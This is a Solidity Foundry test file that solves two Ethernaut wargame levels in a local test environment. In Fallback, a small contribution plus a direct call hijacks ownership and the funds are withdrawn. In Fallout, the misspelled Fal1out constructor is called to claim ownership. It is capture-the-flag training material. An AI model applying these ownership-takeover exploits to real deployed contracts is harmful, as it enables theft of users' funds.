pragma solidity ^0.8.10;

import "ds-test/test.sol";

// ETHERNAUT CORE CONTRACTS

import "../EthernautCore/Ethernaut.sol";
import "../EthernautCore/FallbackFactory.sol";
import "../EthernautCore/FalloutFactory.sol";
import "../EthernautCore/CoinFlipFactory.sol";
import "../EthernautCore/TelephoneFactory.sol";
import "../EthernautCore/TokenFactory.sol";
import "../EthernautCore/DelegationFactory.sol";
import "../EthernautCore/ForceFactory.sol";
import "../EthernautCore/VaultFactory.sol";
import "../EthernautCore/KingFactory.sol";
import "../EthernautCore/ReentranceFactory.sol";
import "../EthernautCore/ElevatorFactory.sol";
import "../EthernautCore/PrivacyFactory.sol";


// CHEATCODES FOR TESTING - see https://onbjerg.github.io/foundry-book/reference/cheatcodes.html

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called  
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Sets an address' balance
  function deal(address who, uint256 newBalance) external;
  // Set block.number
  function roll(uint256) external;
}

contract EthernautTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        cheats.deal(eoaAddress, 5 ether);
    }

    function fallbackSetUp() private returns (Fallback, address) {
        // Register the Ethernaut level (this would have already been done on Rinkeby)
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        cheats.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));
        cheats.stopPrank();
        return (ethernautFallback, levelAddress);
    }

    function testFallback() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        (Fallback ethernautFallback, address levelAddress) = fallbackSetUp();
        cheats.startPrank(eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(eoaAddress), 1 wei);

        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");

        // Verify contract owner has been updated to 0 address
        assertEq(ethernautFallback.owner(), eoaAddress);

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }

    function falloutSetUp() private returns (Fallout, address) {
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        cheats.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));
        cheats.stopPrank();
        return (ethernautFallout, levelAddress);
    }

    function testFallout() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        (Fallout ethernautFallout, address levelAddress) = falloutSetUp();
        cheats.startPrank(eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Call Fal1out constructor function with some value, mispelling enables us to call it  
        ethernautFallout.Fal1out{value: 1 wei}();


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }




}